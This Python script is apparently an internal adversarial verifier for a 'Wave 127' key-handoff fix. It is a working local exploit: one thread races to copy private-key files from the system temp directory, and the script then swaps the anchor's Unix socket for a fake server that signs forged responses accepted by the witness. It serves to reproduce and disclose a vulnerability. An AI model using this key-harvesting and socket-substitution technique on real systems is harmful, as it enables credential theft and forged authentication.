#!/usr/bin/env python3
"""Independent adversarial verifier for Wave 127's repaired OpenSSL key handoff.

The Wave 127 fixed wrapper reads the anchor's response private key through the
pinned store handle, writes those same private bytes to a mode-0600 tempfile in
the process-global temp directory, invokes OpenSSL, then unlinks the tempfile.

This reproducer models the same local pathname-substitution adversary used by
verifier PR #51, but gives it no initial anchor-store access and no response
private key. A same-UID observer watches only the system temp directory while
the genuine anchor signs ordinary requests. If it can copy one ephemeral key
file, it then substitutes only the anchor Unix-socket pathname and signs exact
nonce/request-bound responses. The genuine anchor process and durable anchor
store remain alive and untouched.

Expected adversarial verdict when the implementation is vulnerable:
FAIL_EPHEMERAL_RESPONSE_PRIVATE_KEY_EXFILTRATION_REOPENS_SOCKET_SUBSTITUTION

Verifier lane only / NON-CANON / do not auto-merge.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

import AXM_FLOWING_COMPUTE_PROCESS_WITNESS as w
import AXM_FLOWING_COMPUTE_PROCESS_WITNESS_ANCHORED as w126
import AXM_FLOWING_COMPUTE_PROCESS_WITNESS_AUTHENTICATED_ANCHOR_FIXED as w127

TOOL = Path(w127.__file__).resolve()
VERDICT = "FAIL_EPHEMERAL_RESPONSE_PRIVATE_KEY_EXFILTRATION_REOPENS_SOCKET_SUBSTITUTION"


def h(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


def wait_file(path: Path, proc: subprocess.Popen | None = None,
              timeout: float = 8.0) -> None:
    end = time.time() + timeout
    while time.time() < end:
        if path.exists():
            return
        if proc is not None and proc.poll() is not None:
            out, err = proc.communicate()
            raise RuntimeError(
                f"process-exited-before-ready:{proc.returncode}:{out}:{err}"
            )
        time.sleep(0.02)
    raise TimeoutError(f"marker-timeout:{path}")


def launch_anchor(anchor_dir: Path, sock: Path, ready: Path,
                  error: Path) -> tuple[subprocess.Popen, dict]:
    for p in (ready, error):
        if p.exists():
            p.unlink()
    proc = subprocess.Popen(
        [
            sys.executable, str(TOOL), "serve-anchor", str(anchor_dir), str(sock),
            "--ready-file", str(ready), "--error-file", str(error),
        ],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    wait_file(ready, proc)
    return proc, json.loads(ready.read_text())


def launch_witness(witness_dir: Path, sock: Path, anchor_sock: Path,
                   anchor_fp: str, ready: Path,
                   error: Path) -> tuple[subprocess.Popen, dict]:
    for p in (ready, error):
        if p.exists():
            p.unlink()
    proc = subprocess.Popen(
        [
            sys.executable, str(TOOL), "serve-witness", str(witness_dir), str(sock),
            str(anchor_sock), anchor_fp,
            "--ready-file", str(ready), "--error-file", str(error),
        ],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    wait_file(ready, proc)
    return proc, json.loads(ready.read_text())


def hard_kill(proc: subprocess.Popen | None) -> None:
    if proc is None or proc.poll() is not None:
        return
    try:
        os.kill(proc.pid, signal.SIGKILL)
    except ProcessLookupError:
        return
    proc.wait(timeout=3)


def stop_witness(proc: subprocess.Popen | None, sock: Path) -> None:
    if proc is None or proc.poll() is not None:
        return
    try:
        w.request(sock, {"op": "stop"}, timeout=1.0)
    except Exception:
        pass
    try:
        proc.wait(timeout=2)
    except subprocess.TimeoutExpired:
        hard_kill(proc)


class TempPrivateKeyHarvester:
    """Observe only Wave 127 helper files in the system temp directory."""

    def __init__(self) -> None:
        self.tempdir = Path(tempfile.gettempdir())
        self.captured: bytes | None = None
        self.captured_name: str | None = None
        self.stop = threading.Event()
        self.thread = threading.Thread(target=self._run, daemon=True)

    def start(self) -> None:
        self.thread.start()

    def close(self) -> None:
        self.stop.set()
        self.thread.join(timeout=2)

    def _run(self) -> None:
        while not self.stop.is_set() and self.captured is None:
            try:
                entries = list(self.tempdir.glob("axm-w127-private-*"))
            except Exception:
                entries = []
            for path in entries:
                try:
                    data = path.read_bytes()
                except (FileNotFoundError, PermissionError, OSError):
                    continue
                if (
                    b"-----BEGIN PRIVATE KEY-----" in data
                    and b"-----END PRIVATE KEY-----" in data
                ):
                    self.captured = data
                    self.captured_name = path.name
                    self.stop.set()
                    return
            time.sleep(0.0002)


class SignedSubstituteAnchor:
    """Fake pathname endpoint using only the harvested response private key."""

    def __init__(self, sock: Path, anchor_fp: str, witness_fp: str,
                 response_fp: str, stolen_private_path: Path):
        self.sock = sock
        self.anchor_fp = anchor_fp
        self.witness_fp = witness_fp
        self.response_fp = response_fp
        self.stolen_private_path = stolen_private_path
        self.seen: list[dict] = []
        self.ready = threading.Event()
        self.stop = threading.Event()
        self.error: str | None = None
        self.thread = threading.Thread(target=self._run, daemon=True)

    def start(self) -> None:
        self.thread.start()
        if not self.ready.wait(5):
            raise TimeoutError("signed-substitute-not-ready")
        if self.error:
            raise RuntimeError(self.error)

    def close(self) -> None:
        self.stop.set()
        try:
            with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
                s.settimeout(0.2)
                s.connect(str(self.sock))
                s.sendall(b"{}\n")
        except Exception:
            pass
        self.thread.join(timeout=2)

    def _run(self) -> None:
        listener = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            listener.bind(str(self.sock))
            listener.listen(16)
            listener.settimeout(0.2)
            self.ready.set()
            while not self.stop.is_set():
                try:
                    conn, _ = listener.accept()
                except socket.timeout:
                    continue
                with conn:
                    data = b""
                    while not data.endswith(b"\n"):
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        data += chunk
                    if not data:
                        continue
                    try:
                        request = json.loads(data)
                    except Exception:
                        continue
                    if not isinstance(request, dict) or "payload" not in request:
                        continue
                    self.seen.append(request)
                    payload = request.get("payload")
                    records = payload.get("records") if isinstance(payload, dict) else []
                    records = records or []
                    head = records[-1]["record_sha"] if records else "0" * 64
                    body = {
                        "ok": True,
                        "anchor_credential_fingerprint": self.anchor_fp,
                        "witness_credential_fingerprint": self.witness_fp,
                        "response_public_fingerprint": self.response_fp,
                        "anchor_seq": len(records),
                        "anchor_record_sha": "e" * 64,
                        "witness_record_sha": head,
                        "appended": 0,
                        "idempotent": True,
                    }
                    response = w127._signed_response(
                        self.anchor_fp, request, body, self.stolen_private_path
                    )
                    conn.sendall(w.canonical(response) + b"\n")
        except BaseException as exc:
            self.error = f"{type(exc).__name__}:{exc}"
            self.ready.set()
        finally:
            try:
                listener.close()
            except Exception:
                pass


def run() -> dict:
    report = {
        "wave": 127,
        "verifier": "temp private-key exfiltration / signed socket substitution",
        "verdict": None,
        "attack_reproduced": False,
        "controls": [],
        "truth_boundary": [
            "same Linux host and same Unix uid as the prior pathname-substitution adversary",
            "attacker begins without anchor-store reads and without the response private key",
            "attacker observes only system-temp helper files emitted by the Wave 127 fixed wrapper",
            "genuine anchor process and durable anchor store remain alive and untouched during substitution",
            "no witness credential, anchor HMAC credential, or durable ledger is forged or rewritten",
            "this is not a cross-host, physical-finality, performance, energy, or retained-compute result",
        ],
    }

    with tempfile.TemporaryDirectory(prefix="axm-wave127-verifier-") as td:
        b = Path(td)
        wd = b / "witness"
        ad = b / "anchor"
        wsock = b / "witness.sock"
        asock = b / "anchor.sock"
        local = b / "local.jsonl"
        captured_path = b / "harvested-response-private.pem"

        witness_root = w.initialize_witness_dir(wd, "wave127-verifier-witness")
        witness_fp = witness_root["credential_fingerprint"]
        anchor_root = w127.initialize_anchor_dir(ad, wd, "wave127-verifier-anchor")
        anchor_fp = anchor_root["anchor_credential_fingerprint"]
        binding, public_key = w127.load_response_binding(wd, anchor_fp)
        response_fp = binding["response_public_fingerprint"]

        p_anchor = p_witness = None
        harvester = TempPrivateKeyHarvester()
        fake = None
        try:
            p_anchor, ainfo = launch_anchor(
                ad, asock, b / "anchor.ready", b / "anchor.error"
            )
            harvester.start()

            signed_requests = 0
            for _ in range(256):
                w127.anchor_request(asock, {"op": "ping"}, anchor_fp, public_key)
                signed_requests += 1
                if harvester.captured is not None:
                    break
            harvester.close()

            captured = harvester.captured
            if captured is not None:
                captured_path.write_bytes(captured)
                os.chmod(captured_path, 0o600)
                probe = b"AXM-W127-VERIFIER-POSSESSION-PROBE"
                probe_sig = w127._sign(captured_path, probe)
                stolen_key_valid = w127._verify(public_key, probe, probe_sig)
            else:
                stolen_key_valid = False

            report["controls"].append({
                "name": "ephemeral_private_key_is_observable_outside_anchor_store",
                "ok": bool(captured is not None and stolen_key_valid),
                "detail": {
                    "signed_requests_before_capture": signed_requests,
                    "captured_temp_basename": harvester.captured_name,
                    "captured_bytes": len(captured or b""),
                    "matches_pinned_public_verifier": stolen_key_valid,
                },
            })

            if not (captured is not None and stolen_key_valid):
                report["verdict"] = "INCONCLUSIVE_TEMP_KEY_NOT_CAPTURED"
                return report

            p_witness, winfo = launch_witness(
                wd, wsock, asock, anchor_fp, b / "witness.ready", b / "witness.error"
            )
            a1, t1 = h("wave127-verifier-a1"), h("wave127-verifier-t1")
            first = w.decide_and_publish(
                wsock, witness_fp, local, a1, t1, "COMMIT", True, ""
            )

            aroot, asecret, anchor_copy_of_witness_secret = w126.load_anchor_identity(ad)
            genuine_before = w126.load_anchor_ledger(
                ad, aroot, asecret, anchor_copy_of_witness_secret
            )
            report["controls"].append({
                "name": "genuine_prefix_is_anchored_before_substitution",
                "ok": first["record"]["seq"] == 1 and len(genuine_before) == 1,
                "detail": {
                    "anchor_ready": ainfo,
                    "witness_ready": winfo,
                    "genuine_anchor_seq": len(genuine_before),
                },
            })

            # Preserve the genuine process/store. Replace only the mutable
            # pathname, exactly as in PR #51, but now sign with the key leaked
            # by Wave 127's own fixed key-handoff path.
            asock.unlink()
            fake = SignedSubstituteAnchor(
                asock, anchor_fp, witness_fp, response_fp, captured_path
            )
            fake.start()

            a2, t2 = h("wave127-verifier-a2"), h("wave127-verifier-t2")
            second = w.decide_and_publish(
                wsock, witness_fp, local, a2, t2, "COMMIT", True, ""
            )
            second_status = w.status(wsock, witness_fp, local, a2)
            witness_rows = w.load_ledger(wd, w.load_identity(wd)[1])
            genuine_after = w126.load_anchor_ledger(
                ad, aroot, asecret, anchor_copy_of_witness_secret
            )

            reproduced = (
                second["record"]["seq"] == 2
                and len(witness_rows) == 2
                and second_status.get("status") == "AUTHORITATIVE_PROCESS_WITNESS_COMMIT"
                and len(genuine_after) == 1
                and p_anchor.poll() is None
                and len(fake.seen) >= 2
            )
            report["attack_reproduced"] = bool(reproduced)
            report["verdict"] = VERDICT if reproduced else "ATTACK_DID_NOT_REPRODUCE"
            report["attack"] = {
                "second_decision_seq": second["record"]["seq"],
                "witness_rows": len(witness_rows),
                "genuine_anchor_rows": len(genuine_after),
                "genuine_anchor_alive": p_anchor.poll() is None,
                "fake_signed_requests": len(fake.seen),
                "status": second_status,
                "private_key_source": "system temp helper only",
                "anchor_store_modified": False,
            }
            return report
        finally:
            harvester.close()
            if fake is not None:
                fake.close()
            stop_witness(p_witness, wsock)
            hard_kill(p_anchor)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--report")
    ns = ap.parse_args()
    report = run()
    text = json.dumps(report, indent=2, sort_keys=True)
    print(text)
    if ns.report:
        Path(ns.report).write_text(text + "\n")
    return 0 if report.get("attack_reproduced") else 1


if __name__ == "__main__":
    raise SystemExit(main())
